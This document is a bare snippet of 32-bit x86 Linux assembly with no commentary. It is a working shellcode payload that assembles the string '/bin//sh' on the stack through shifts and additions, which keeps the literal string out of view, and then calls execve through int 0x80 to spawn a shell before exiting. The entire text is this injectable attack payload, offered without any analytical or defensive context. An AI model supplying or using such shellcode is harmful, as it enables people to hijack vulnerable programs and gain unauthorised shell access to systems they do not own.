xor eax, eax
xor ecx, ecx
push eax
nop
xor eax, eax
mov cl, 0x68
add eax, ecx
shl eax, 1
shl eax, 1
shl eax, 1
shl eax, 1
shl eax, 1
shl eax, 1
shl eax, 1
shl eax, 1
mov cl, 0x73
add eax, ecx
shl eax, 1
shl eax, 1
shl eax, 1
shl eax, 1
shl eax, 1
shl eax, 1
shl eax, 1
shl eax, 1
mov cl, 0x2f
add eax, ecx
shl eax, 1
shl eax, 1
shl eax, 1
shl eax, 1
shl eax, 1
shl eax, 1
shl eax, 1
shl eax, 1
mov cl, 0x2f
add eax, ecx
push eax
nop
xor eax, eax
mov cl, 0x6e
add eax, ecx
shl eax, 1
shl eax, 1
shl eax, 1
shl eax, 1
shl eax, 1
shl eax, 1
shl eax, 1
shl eax, 1
mov cl, 0x69
add eax, ecx
shl eax, 1
shl eax, 1
shl eax, 1
shl eax, 1
shl eax, 1
shl eax, 1
shl eax, 1
shl eax, 1
mov cl, 0x62
add eax, ecx
shl eax, 1
shl eax, 1
shl eax, 1
shl eax, 1
shl eax, 1
shl eax, 1
shl eax, 1
shl eax, 1
mov cl, 0x2f
add eax, ecx
push eax
nop
xor eax, eax
mov ebx, esp
mov ecx, eax
mov edx, eax
mov al, 0xb
int 0x80
xor eax, eax
inc eax
nop
int 0x80
